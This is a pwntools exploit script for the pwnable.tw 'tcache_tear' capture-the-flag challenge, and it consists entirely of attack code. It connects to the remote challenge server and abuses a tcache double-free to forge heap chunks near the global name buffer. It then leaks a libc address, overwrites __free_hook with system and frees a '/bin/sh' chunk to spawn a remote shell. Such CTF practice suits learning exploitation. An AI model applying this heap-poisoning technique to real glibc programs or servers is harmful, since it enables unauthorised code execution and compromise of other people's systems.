from pwn import *

context.log_level = 'debug'
exe = context.binary = ELF('./tcache_tear_patched', checksec=False)
libc = ELF('./libc-18292bd12d37bfaf58e8dded9db7f1f5da1192cb.so', checksec=False)
# r = process(exe.path)
# gdb.attach(r, api=True, gdbscript='''
#            b*0x400C11
#            c
#            c 25
#            b*0x0000000000400B54
#            ''')

r = remote('chall.pwnable.tw', 10207)

def malloc(size, data):
    r.sendafter(b'choice :', b'1')
    r.sendafter(b'Size:', str(size).encode('utf-8'))
    r.sendafter(b'Data:', data)
    
def freeandinfo(choice):
    r.sendafter(b'choice :', choice)
    

libc.sym['exe_hook'] = 0x619f5a
libc.sym['one_gadget'] = 0x4f322
    
r.sendafter(b'Name', b'\x41'*8 + p64(0x91))

size_ = 8
name_addr = 0x602060
stderr = 0x602040
ptr = 0x602088

malloc(size_, b'a')
freeandinfo(b'2')
freeandinfo(b'2')
malloc(size_ + 24, b'aaaa')
freeandinfo(b'2')
malloc(size_ + 40, b'aaaa')
freeandinfo(b'2')
malloc(size_ + 56, b'aaaa')
freeandinfo(b'2')

payload = p64(stderr) + b'\x00'*16 + p64(0x31) + p64(stderr) + b'\x00'*32 + p64(0x41) + p64(name_addr + 16) + b'\x00'*48 + p64(0x51) + p64(name_addr + 16)

malloc(size_, payload)
malloc(size_ + 24, b'a')
# payload = p64(0x41) + b'\x50'
malloc(size_ + 24, b'\x50')
malloc(size_, b'a')
malloc(size_, b'a')

payload = b'\x00'*40 + p64(0x91)
malloc(size_, payload)

malloc(size_ + 24, b'\x87')
freeandinfo(b'2')

malloc(size_ + 40, b'a')
malloc(size_ + 40, b'a')
freeandinfo(b'2')
freeandinfo(b'3')

r.recvuntil(b'Name :')
r.recv(16)
out = r.recv(8)
libc.address = u64(out) - 0x3ec680
print(hex(libc.address))

malloc(size_ + 56, b'a')
malloc(size_ + 56, p64(libc.sym['__free_hook']))
malloc(size_ + 120, b'a')
malloc(size_ + 120, p64(libc.sym['system']))

malloc(size_ + 112, b'/bin/sh')
freeandinfo(b'2')

r.interactive()